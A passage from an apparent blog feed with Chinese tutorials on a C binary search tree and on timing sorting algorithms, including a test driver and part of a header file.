    <content><![CDATA[<h1 id="排序二叉树"><a href="#排序二叉树" class="headerlink" title="排序二叉树"></a>排序二叉树</h1><h2 id="1-分部"><a href="#1-分部" class="headerlink" title="1 分部"></a>1 分部</h2><h3 id="1-1-头文件以及宏定义"><a href="#1-1-头文件以及宏定义" class="headerlink" title="1.1 头文件以及宏定义"></a>1.1 头文件以及宏定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TREE_TYPE int</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-结构体-TREE-NODE-定义"><a href="#1-2-结构体-TREE-NODE-定义" class="headerlink" title="1. 2 结构体 TREE_NODE 定义"></a>1. 2 结构体 TREE_NODE 定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> &#123;</span></span><br><span class="line">    TREE_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TreeNode *tree = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-insert-插入"><a href="#1-3-insert-插入" class="headerlink" title="1.3 insert 插入"></a>1.3 insert 插入</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(TREE_TYPE value)</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link;</span><br><span class="line"></span><br><span class="line">    link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((current = *link) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    current = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TreeNode));</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line">    current-&gt;value = value;</span><br><span class="line">    current-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    *link = current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-find-查找"><a href="#1-4-find-查找" class="headerlink" title="1.4 find 查找"></a>1.4 find 查找</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">TreeNode *<span class="title function_">find</span><span class="params">(TreeNode *current, TREE_TYPE value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span> &amp;&amp; current-&gt;value != value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            current = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            current = current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> current;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-delete-删除"><a href="#1-5-delete-删除" class="headerlink" title="1.5 delete 删除"></a>1.5 delete 删除</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(TREE_TYPE value)</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link;</span><br><span class="line"></span><br><span class="line">    link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((current = *link) != <span class="literal">NULL</span> &amp;&amp; value != current-&gt;value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> &amp;&amp; current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *link = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> || current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;left != <span class="literal">NULL</span>)</span><br><span class="line">            *link = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *link = current-&gt;right;</span><br><span class="line">        <span class="built_in">free</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//左右子树都不为空</span></span><br><span class="line">        TreeNode *this_child;</span><br><span class="line">        TreeNode *next_child;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*转左，然后向右到尽头*/</span></span><br><span class="line">        this_child = current;</span><br><span class="line">        next_child = this_child-&gt;left;</span><br><span class="line">        <span class="keyword">while</span> (next_child-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            this_child = next_child;</span><br><span class="line">            next_child = next_child-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        current-&gt;value = next_child-&gt;value;</span><br><span class="line">        <span class="keyword">if</span> (this_child != current)</span><br><span class="line">            this_child-&gt;right = next_child-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            this_child-&gt;left = next_child-&gt;left;</span><br><span class="line">        <span class="built_in">free</span>(next_child);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-pre-order-traverse"><a href="#1-6-pre-order-traverse" class="headerlink" title="1.6  pre_order_traverse"></a>1.6  pre_order_traverse</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pre_order_traverse</span><span class="params">(TreeNode *current,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> (*callback)(TREE_TYPE value))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        callback(current-&gt;value);</span><br><span class="line">        pre_order_traverse(current-&gt;left, callback);</span><br><span class="line">        pre_order_traverse(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-7-print-tree"><a href="#1-7-print-tree" class="headerlink" title="1.7 print_tree"></a>1.7 print_tree</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print_tree</span><span class="params">(TREE_TYPE value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-8-inner-order-traverse"><a href="#1-8-inner-order-traverse" class="headerlink" title="1.8 inner_order_traverse"></a>1.8 inner_order_traverse</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">inner_order_traverse</span><span class="params">(TreeNode *current,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> (*callback)(TREE_TYPE value))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        inner_order_traverse(current-&gt;left, callback);</span><br><span class="line">        callback(current-&gt;value);</span><br><span class="line">        inner_order_traverse(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-9-post-order-traverse"><a href="#1-9-post-order-traverse" class="headerlink" title="1.9 post_order_traverse"></a>1.9 post_order_traverse</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">post_order_traverse</span><span class="params">(TreeNode *current,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> (*callback)(TREE_TYPE value))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        post_order_traverse(current-&gt;left, callback);</span><br><span class="line">        post_order_traverse(current-&gt;right, callback);</span><br><span class="line">        callback(current-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-10-main"><a href="#1-10-main" class="headerlink" title="1.10 main"></a>1.10 main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    TreeNode *p;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        value = rand() % <span class="number">100</span>;</span><br><span class="line">        insert(i);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    pre_order_traverse(tree, print_tree); //前序</span></span><br><span class="line">    inner_order_traverse(tree, print_tree); <span class="comment">//中序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//    post_order_traverse(tree, print_tree); //后序</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>);   <span class="comment">//删除某个节点</span></span><br><span class="line">    inner_order_traverse(tree, print_tree);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-完整代码"><a href="#2-完整代码" class="headerlink" title="2 完整代码"></a>2 完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TREE_TYPE int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">TREE_NODE</span> &#123;</span><br><span class="line">    TREE_TYPE value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TREE_NODE</span> *left;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">TREE_NODE</span> *right;</span><br><span class="line">&#125;TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> TreeNode *tree = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link;</span><br><span class="line"></span><br><span class="line">    link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((current = *link) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    current = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(TreeNode));</span><br><span class="line">    <span class="built_in">assert</span>(current != <span class="literal">NULL</span>);</span><br><span class="line">    current-&gt;value = value;</span><br><span class="line">    current-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    *link = current;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode *<span class="title">find</span><span class="params">(TreeNode *current, TREE_TYPE value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span> &amp;&amp; current-&gt;value != value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            current = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            current = current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> current;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">(TREE_TYPE value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link;</span><br><span class="line"></span><br><span class="line">    link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((current = *link) != <span class="literal">NULL</span> &amp;&amp; value != current-&gt;value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(current != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> &amp;&amp; current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *link = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> || current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;left != <span class="literal">NULL</span>)</span><br><span class="line">            *link = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *link = current-&gt;right;</span><br><span class="line">        <span class="built_in">free</span>(current);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//左右子树都不为空</span></span><br><span class="line">        TreeNode *this_child;</span><br><span class="line">        TreeNode *next_child;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*转左，然后向右到尽头*/</span></span><br><span class="line">        this_child = current;</span><br><span class="line">        next_child = this_child-&gt;left;</span><br><span class="line">        <span class="keyword">while</span> (next_child-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            this_child = next_child;</span><br><span class="line">            next_child = next_child-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        current-&gt;value = next_child-&gt;value;</span><br><span class="line">        <span class="keyword">if</span> (this_child != current)</span><br><span class="line">            this_child-&gt;right = next_child-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            this_child-&gt;left = next_child-&gt;left;</span><br><span class="line">        <span class="built_in">free</span>(next_child);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">pre_order_traverse</span><span class="params">(TreeNode *current,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">void</span> (*callback)(TREE_TYPE value))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">callback</span>(current-&gt;value);</span><br><span class="line">        <span class="built_in">pre_order_traverse</span>(current-&gt;left, callback);</span><br><span class="line">        <span class="built_in">pre_order_traverse</span>(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print_tree</span><span class="params">(TREE_TYPE value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inner_order_traverse</span><span class="params">(TreeNode *current,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">void</span> (*callback)(TREE_TYPE value))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">inner_order_traverse</span>(current-&gt;left, callback);</span><br><span class="line">        <span class="built_in">callback</span>(current-&gt;value);</span><br><span class="line">        <span class="built_in">inner_order_traverse</span>(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">post_order_traverse</span><span class="params">(TreeNode *current,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">void</span> (*callback)(TREE_TYPE value))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">post_order_traverse</span>(current-&gt;left, callback);</span><br><span class="line">        <span class="built_in">post_order_traverse</span>(current-&gt;right, callback);</span><br><span class="line">        <span class="built_in">callback</span>(current-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TreeNode *p;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, value = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        value = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">insert</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    pre_order_traverse(tree, print_tree); //前序</span></span><br><span class="line">    <span class="built_in">inner_order_traverse</span>(tree, print_tree); <span class="comment">//中序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//    post_order_traverse(tree, print_tree); //后序</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">delete</span>(<span class="number">1</span>);   <span class="comment">//删除某个节点</span></span><br><span class="line">    <span class="built_in">inner_order_traverse</span>(tree, print_tree);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2021/05/15/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><h2 id="一、算法库"><a href="#一、算法库" class="headerlink" title="一、算法库"></a>一、算法库</h2><p>下面</p>
<h2 id="二、大数据集上排序算法性能的体验"><a href="#二、大数据集上排序算法性能的体验" class="headerlink" title="二、大数据集上排序算法性能的体验"></a>二、大数据集上排序算法性能的体验</h2><p>请在给出的参考算法中，用给出的测试数据来测试排序算法运行时间的程序。写成一个主程序调用各排序函数，查看每次排序的结果，并给出各种排序方法的排序时间比较。观察输出结果。得到对复杂度不同的各种算法在运行时间方面的感性认识。本项目旨在获得对于复杂度不同算法的感性认识，由于数据分布特点、计算机运行状态等不同，其结果并不能完全代替对算法复杂度的理论分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提示1：这一项目需要整合多种排序算法，可以考虑先建设排序算法库，作为我们这门课算法库的收官之作； </span><br><span class="line">提示2：本项目旨在获得对于复杂度不同算法的感性认识，由于数据分布特点、计算机运行状态等不同，其结果并不能完全代替对算法复杂度的理论分析； </span><br><span class="line">提示3：由于C语言标准提供的时间函数只精确到秒，几种O(nlog2n)级别的算法，在5万条记录的压力下，并不能明显地看出优劣，可以忽略直接插入排序、冒泡排序、直接选择排序这三种相对低效率的算法（以节约时间。若能够忍受他们长时间地运行，请自便），成10倍地加大数据量，然后进行观察。</span><br></pre></td></tr></table></figure>

<h3 id="1-测试用的主控程序——main-cpp"><a href="#1-测试用的主控程序——main-cpp" class="headerlink" title="1.测试用的主控程序——main.cpp"></a>1.测试用的主控程序——main.cpp</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sort.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetLargeData</span><span class="params">(RecType *&amp;R, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    R=(RecType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RecType)*n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">        R[i].key= <span class="built_in">rand</span>();  <span class="comment">//产生0~RAND_MAX间的数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;生成了%d条记录\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用某一排序算法完成排序，返回排序用时</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">Sort</span><span class="params">(RecType *&amp;R, <span class="type">int</span> n, <span class="type">void</span> f(RecType*, <span class="type">int</span>))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">long</span> beginTime, endTime;</span><br><span class="line">    RecType *R1=(RecType*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RecType)*n);</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        R1[i]=R[i];</span><br><span class="line">    beginTime = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">f</span>(R1,n);</span><br><span class="line">    endTime = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(R1);</span><br><span class="line">    <span class="keyword">return</span> endTime-beginTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用基数排序算法完成排序，返回排序用时</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">Sort1</span><span class="params">(RecType *&amp;R, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> beginTime, endTime;</span><br><span class="line">    RadixRecType *p;</span><br><span class="line">    <span class="built_in">CreateLink</span>(p,R,n);</span><br><span class="line">    beginTime = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">RadixSort</span>(p);</span><br><span class="line">    endTime = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">DestoryLink</span>(p);</span><br><span class="line">    <span class="keyword">return</span> endTime-beginTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RecType *R;</span><br><span class="line">    <span class="type">int</span> n = MaxSize;   <span class="comment">//测试中, MaxSize取50W</span></span><br><span class="line">    <span class="built_in">GetLargeData</span>(R, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;各种排序花费时间：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  直接插入排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, InsertSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  希尔排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, ShellSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  冒泡排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, BubbleSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  快速排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, QuickSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  直接选择排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, SelectSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  堆排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, HeapSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  归并排序：%ld\n&quot;</span>, <span class="built_in">Sort</span>(R, n, MergeSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;  基数排序：%ld\n&quot;</span>, <span class="built_in">Sort1</span>(R, n));</span><br><span class="line">    <span class="built_in">free</span>(R);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-头文件-——-sort-h"><a href="#2-头文件-——-sort-h" class="headerlink" title="2.头文件 —— sort.h"></a>2.头文件 —— sort.h</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SORT_H_INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SORT_H_INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 50000      <span class="comment">//最多的数据，取5万，只测试快速算法，可以往大调整</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面的符号常量和结构体针对基数排序</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Radix 10           <span class="comment">//基数的取值</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Digits 10          <span class="comment">//关键字位数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> KeyType;    <span class="comment">//定义关键字类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> InfoType[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>          <span class="comment">//记录类型</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType key;        <span class="comment">//关键字项</span></span><br><span class="line">    InfoType data;      <span class="comment">//其他数据项,类型为InfoType</span></span><br><span class="line">&#125; RecType;              <span class="comment">//排序的记录类型定义</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">    KeyType data;      <span class="comment">//记录的关键字，同算法讲解中有差别</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span> *next;</span><br><span class="line">&#125; RadixRecType;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InsertSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>; <span class="comment">//直接插入排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShellSort</span><span 